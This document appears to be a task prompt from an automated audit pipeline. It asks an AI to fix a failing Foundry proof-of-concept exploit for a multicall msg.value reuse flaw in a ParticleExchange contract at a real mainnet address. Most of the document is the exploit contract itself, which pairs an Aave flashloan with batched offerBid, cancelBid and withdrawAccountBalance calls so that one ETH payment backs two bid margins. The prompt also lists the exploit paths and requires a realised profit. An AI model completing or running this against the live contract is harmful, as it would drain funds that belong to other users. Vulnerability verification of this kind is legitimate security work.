You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: `multicall` reuses one `msg.value` across multiple payable delegatecalls, allowing unbacked loans and bid margins
- claim: OpenZeppelin `Multicall.multicall()` delegatecalls back into `ParticleExchange`, so every batched subcall observes the original transaction `msg.value`. The exchange then treats that same ETH as fresh funding in each payable path that calls `_balanceAccount(...)` with `msg.value` or `amount + msg.value`, including `swapWithEth`, `sellNftToMarket*`, `refinanceLoan`, `offerBid`, and `updateBid`. Because no per-subcall value accounting is performed, a single ETH payment can collateralize multiple independent state transitions.
- impact: An attacker can create multiple loans or bid margins backed by only one actual payment, leaving the protocol insolvent. This can let the attacker withdraw more ETH than was deposited, or leave lenders with supposedly collateralized positions that cannot all be honored, causing direct fund loss to other users once withdrawals or liquidations occur.
- exploit_paths: ["Call `multicall([swapWithEth(lienA), swapWithEth(lienB)])` with `msg.value` sufficient for only one loan. Each delegatecall sees the full `msg.value`, so both liens become active and two NFTs are released even though only one ETH collateral payment was made.", "Call `multicall([offerBid(collection, margin, ...), offerBid(collection, margin, ...), cancelBid(lien1), cancelBid(lien2), withdrawAccountBalance()])` with ETH sufficient for one margin. Both bids are created as if funded, both cancellations credit the stored margin back, and the attacker withdraws more ETH than entered the contract in that transaction."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

struct Lien {
    address lender;
    address borrower;
    address collection;
    uint256 tokenId;
    uint256 price;
    uint256 rate;
    uint256 loanStartTime;
    uint256 auctionStartTime;
}

interface IParticleExchangeLike {
    function multicall(bytes[] calldata data) external payable returns (bytes[] memory results);
    function offerBid(address collection, uint256 margin, uint256 price, uint256 rate) external payable returns (uint256);
    function cancelBid(Lien calldata lien, uint256 lienId) external;
    function withdrawAccountBalance() external;
}

interface IAaveV3PoolLike {
    function flashLoanSimple(
        address receiverAddress,
        address asset,
        uint256 amount,
        bytes calldata params,
        uint16 referralCode
    ) external;
}

interface IAaveFlashLoanSimpleReceiverLike {
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool);
}

interface IWETHLike {
    function deposit() external payable;
    function withdraw(uint256) external;
    function approve(address spender, uint256 amount) external returns (bool);
}

contract FlawVerifier is IAaveFlashLoanSimpleReceiverLike {
    address public constant TARGET = 0xE4764f9cd8ECc9659d3abf35259638B20ac536E4;
    address public constant AAVE_V3_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fa4E2;
    address public constant WETH = 0xC02aaA39b223FE8D0A0E5C4F27eAD9083C756Cc2;

    uint256 private constant DIRECT_MARGIN = 1;

    uint256 private _profitAmount;
    bool private _hypothesisValidated;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        uint256 balanceBefore = address(this).balance;

        // Both listed exploit paths require an ETH-bearing call into `multicall(bytes[])` so that
        // each delegated subcall observes the same outer-call `msg.value`.
        //
        if (balanceBefore >= DIRECT_MARGIN) {
            _attemptBidPath(DIRECT_MARGIN);
        } else {
            IAaveV3PoolLike(AAVE_V3_POOL).flashLoanSimple(address(this), WETH, DIRECT_MARGIN, bytes(""), 0);
        }

        uint256 balanceAfter = address(this).balance;
        _profitAmount = balanceAfter > balanceBefore ? balanceAfter - balanceBefore : 0;
    }

    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata
    ) external override returns (bool) {
        require(msg.sender == AAVE_V3_POOL, "pool");
        require(initiator == address(this), "initiator");
        require(asset == WETH, "asset");

        IWETHLike(WETH).withdraw(amount);
        _attemptBidPath(amount);
        require(address(this).balance >= amount + premium, "repay");

        IWETHLike(WETH).deposit{value: amount + premium}();
        IWETHLike(WETH).approve(AAVE_V3_POOL, amount + premium);
        return true;
    }

    function profitToken() external pure returns (address) {
        return address(0);
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function _attemptBidPath(uint256 margin) internal returns (bool) {
        require(margin != 0, "margin");

        // The bid branch is the only path that can be fully constructed from current contract state.
        // The swapWithEth branch would additionally require exact pre-existing lien tuples, but the
        // exchange stores only lien hashes onchain, so those tuples are not self-discoverable here.
        bytes[] memory createCalls = new bytes[](2);
        createCalls[0] = abi.encodeCall(IParticleExchangeLike.offerBid, (WETH, margin, 0, 0));
        createCalls[1] = abi.encodeCall(IParticleExchangeLike.offerBid, (WETH, margin, 0, 0));

        (bool ok, bytes memory returndata) =
            TARGET.call{value: margin}(abi.encodeCall(IParticleExchangeLike.multicall, (createCalls)));
        if (!ok) {
            // `lib/openzeppelin-contracts/contracts/utils/Multicall.sol:17` is nonpayable.
            // That rejects the required ETH-bearing entrypoint before any delegatecall executes,
            // so both exploit paths are mechanically blocked:
            // 1. multicall([swapWithEth(lienA), swapWithEth(lienB)])
            // 2. multicall([offerBid(...), offerBid(...), cancelBid(...), cancelBid(...), withdrawAccountBalance()])
            _hypothesisValidated = false;
            return false;
        }

        _hypothesisValidated = true;
        bytes[] memory createResults = abi.decode(returndata, (bytes[]));
        uint256 lienIdA = abi.decode(createResults[0], (uint256));
        uint256 lienIdB = abi.decode(createResults[1], (uint256));

        Lien memory syntheticBid = Lien({
            lender: address(0),
            borrower: address(this),
            collection: WETH,
            tokenId: margin,
            price: 0,
            rate: 0,
            loanStartTime: 0,
            auctionStartTime: 0
        });

        bytes[] memory settleCalls = new bytes[](3);
        settleCalls[0] = abi.encodeCall(IParticleExchangeLike.cancelBid, (syntheticBid, lienIdA));
        settleCalls[1] = abi.encodeCall(IParticleExchangeLike.cancelBid, (syntheticBid, lienIdB));
        settleCalls[2] = abi.encodeCall(IParticleExchangeLike.withdrawAccountBalance, ());

        IParticleExchangeLike(TARGET).multicall(settleCalls);
        return true;
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
Error: Encountered invalid solc version in src/FlawVerifier.sol: No solc version installed that matches the version requirement: =0.8.19
Encountered invalid solc version in src/FlawVerifier.sol: No solc version installed that matches the version requirement: =0.8.19

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
